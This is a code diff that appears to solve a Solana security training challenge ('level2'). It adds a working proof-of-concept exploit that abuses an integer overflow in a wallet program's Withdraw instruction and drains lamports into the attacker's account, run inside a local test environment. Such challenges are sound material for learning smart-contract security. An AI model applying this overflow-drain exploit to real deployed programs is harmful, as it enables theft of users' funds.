@@ -10,6 +10,12 @@ use solana_program::native_token::lamports_to_sol;
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
+use borsh::BorshSerialize;
+use level2::{WalletInstruction, get_wallet_address};
+use solana_program::instruction::{AccountMeta, Instruction};
+use solana_program::rent::Rent;
+use solana_program::sysvar;
+
 struct Challenge {
     hacker: Keypair,
     wallet_program: Pubkey,
@@ -18,8 +24,62 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // Create Hacker Wallet //
+    assert_tx_success(env.execute_as_transaction(
+        &[level2::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+        )],
+        &[&challenge.hacker],
+    ));
 
+    // Get the Hacker's Wallet //
+    let hacker_wallet = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);
+
+    // Get Rent Transfer //
+    let to_transfer = Rent::default().minimum_balance(8);
+    println!("To transfer: {}", to_transfer);
+
+    // Calculate Overflow as a u64 //
+    let overflow = (-(to_transfer as i64)) as u64;
+
+    // Execute x iterations //
+    let iters = 10;
+
+    for i in 0..iters {
+        let tx = env.execute_as_transaction(
+            &[Instruction {
+                program_id: challenge.wallet_program,
+                accounts: vec![
+                    AccountMeta::new(hacker_wallet, false),              // source wallet
+                    AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
+                    AccountMeta::new(challenge.wallet_address, false),   // target wallet
+                    AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
+                ],
+                data: WalletInstruction::Withdraw { amount: overflow+i }.try_to_vec().unwrap(),
+            }],
+            &[&challenge.hacker],
+        );
+        tx.print_named(&format!("haxx {}", i));
+    }
+
+    // Transfer everything from the Account to the Hacker's Pubkey //
+    let tx = env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false),              // source wallet
+                AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
+                AccountMeta::new(challenge.hacker.pubkey(), false),  // target wallet
+                AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
+            ],
+            data: WalletInstruction::Withdraw { amount: to_transfer*iters-1000 }.try_to_vec().unwrap(),
+        }],
+        &[&challenge.hacker],
+    );
+    tx.print_named("hacker withdraw");
+}
 /*
 SETUP CODE BELOW
 */
